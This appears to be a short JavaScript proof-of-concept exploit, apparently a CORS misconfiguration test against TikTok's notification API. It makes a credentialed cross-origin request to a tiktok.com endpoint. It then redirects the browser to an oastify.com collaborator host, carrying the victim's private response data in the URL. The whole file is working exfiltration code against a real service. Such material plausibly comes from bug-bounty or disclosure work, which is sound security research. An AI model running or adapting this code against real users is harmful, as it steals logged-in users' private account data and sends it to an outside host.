var xhr = new XMLHttpRequest();
xhr.onload = reqListener; 
xhr.open("GET", "https://www.tiktok.com/api/notice/multi/?aid=1988&app_language=es&app_name=tiktok_web&browser_language=en-US&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%29&channel=tiktok_web&cookie_enabled=true&device_id=7059024763654440449&device_platform=web_pc&focus_state=true&from_page=setting&group_list=%5B%7B%22count%22%3A20%2C%22is_mark_read%22%3A1%2C%22group%22%3A500%2C%22max_time%22%3A0%2C%22min_time%22%3A0%7D%5D&history_len=3&is_fullscreen=false&is_page_visible=true&os=windows&priority_region=IL&referer=https%3A%2F%2Fwww.tiktok.com%2F&region=IL&root_referer=https%3A%2F%2Fwww.tiktok.com%2F&screen_height=1080&screen_width=1920&tz_name=Asia%2FJerusalem&webcast_language=es&msToken=&X-Bogus=&_signature=");
xhr.withCredentials = true;
xhr.send();

function reqListener() {
    location='//u3y5ofp07x2nhjhbwfincxp5bwhn5dt2.oastify.com/log?key='+this.responseText; 
};
